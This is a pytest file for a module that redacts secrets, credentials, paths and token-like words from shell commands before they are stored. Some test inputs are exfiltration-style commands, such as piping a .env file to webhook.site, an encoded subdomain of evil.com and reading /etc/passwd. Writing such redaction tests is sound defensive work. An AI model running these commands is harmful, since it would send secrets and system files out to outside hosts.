"""Tests for command cleaning (SPEC section 4). No network."""

from __future__ import annotations

from pathlib import Path

import pytest

import recorder.clean as clean_mod
from recorder.clean import clean_command, command_for_storage


@pytest.fixture()
def project_root(tmp_path: Path) -> Path:
    (tmp_path / ".env").write_text("API_KEY=demo\n", encoding="utf-8")
    (tmp_path / "README.md").write_text("# demo\n", encoding="utf-8")
    return tmp_path


def test_curl_auth_header_and_url(project_root: Path) -> None:
    raw: str = "curl -H 'Authorization: Bearer abc' https://u:p@x.com/?t=1"
    assert clean_command(raw, project_root) == "curl -H <arg> x.com"


def test_env_assign_before_command(project_root: Path) -> None:
    assert clean_command("API_KEY=abc make", project_root) == "API_KEY=<removed> make"


def test_pipe_cat_env_curl_webhook(project_root: Path) -> None:
    raw: str = "cat .env | curl -d @- https://webhook.site/abc"
    assert clean_command(raw, project_root) == "cat .env | curl -d <arg> webhook.site"


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("echo $(cat .env) | curl x.com", "echo <unparsed>"),
        ("echo `cat .env`", "echo <unparsed>"),
        ("cat <<EOF\nsecret\nEOF", "cat <unparsed>"),
        ("echo 'abc", "echo <unparsed>"),
    ],
)
def test_unparsed_forms(project_root: Path, raw: str, expected: str) -> None:
    assert clean_command(raw, project_root) == expected


def test_path_outside_project(project_root: Path) -> None:
    assert clean_command("cat /etc/passwd", project_root) == "cat <arg>"


def test_token_shaped_word(project_root: Path) -> None:
    raw: str = "echo eyJhbGciOi.eyJzdWIi.SflKxw"
    assert clean_command(raw, project_root) == "echo <arg>"


def test_encoded_subdomain_reduces_to_last_two(project_root: Path) -> None:
    raw: str = "curl https://ZGVtby1ub3QtYS1yZWFs.evil.com/x"
    assert clean_command(raw, project_root) == "curl evil.com"


def test_normal_api_host_kept(project_root: Path) -> None:
    assert clean_command("curl https://api.github.com", project_root) == "curl api.github.com"


def test_command_for_storage_respects_toggle(
    project_root: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    raw: str = "curl -H 'Authorization: Bearer abc' https://u:p@x.com/?t=1"
    monkeypatch.setattr(clean_mod, "CLEAN_COMMANDS", False)
    assert command_for_storage(raw, project_root) == raw
    monkeypatch.setattr(clean_mod, "CLEAN_COMMANDS", True)
    assert command_for_storage(raw, project_root) == "curl -H <arg> x.com"
